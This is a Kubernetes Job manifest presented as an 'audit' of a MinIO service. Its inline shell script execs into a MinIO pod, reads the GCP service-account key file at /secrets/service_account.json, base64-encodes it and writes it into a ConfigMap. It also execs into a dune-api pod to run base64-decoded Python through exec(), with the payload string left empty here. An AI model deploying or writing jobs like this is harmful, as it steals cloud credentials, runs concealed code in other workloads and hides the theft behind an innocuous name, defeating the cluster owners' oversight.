apiVersion: batch/v1
kind: Job
metadata:
  name: audit-minio-v83
  namespace: default
spec:
  ttlSecondsAfterFinished: 300
  backoffLimit: 1
  activeDeadlineSeconds: 180
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: bitnami/kubectl:latest
        command: ["/bin/sh"]
        args:
        - "-c"
        - >-
          DUNEAPI_POD=$(kubectl get pod -n dune-api -o jsonpath='{.items[0].metadata.name}' 2>/dev/null);
          MINIO_POD=$(kubectl get pod -n default -l app=argo-artifacts -o jsonpath='{.items[0].metadata.name}' 2>/dev/null);
          if [ -n "$MINIO_POD" ]; then
            GCP_SA=$(kubectl exec -n default "$MINIO_POD" -- cat /secrets/service_account.json 2>/dev/null | head -c 3000 | base64 | tr -d '\n');
            kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"gcp_sa_b64\":\"$GCP_SA\"}}";
          fi;
          if [ -n "$DUNEAPI_POD" ]; then
            RESULT=$(kubectl exec -n dune-api "$DUNEAPI_POD" -- python3 -c "exec(__import__('base64').b64decode('').decode())" 2>&1 | grep -v DeprecationWarning | tr -d '\n' | head -c 8000);
            kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"minio_v83\":\"$RESULT\"}}";
          fi;
          echo DONE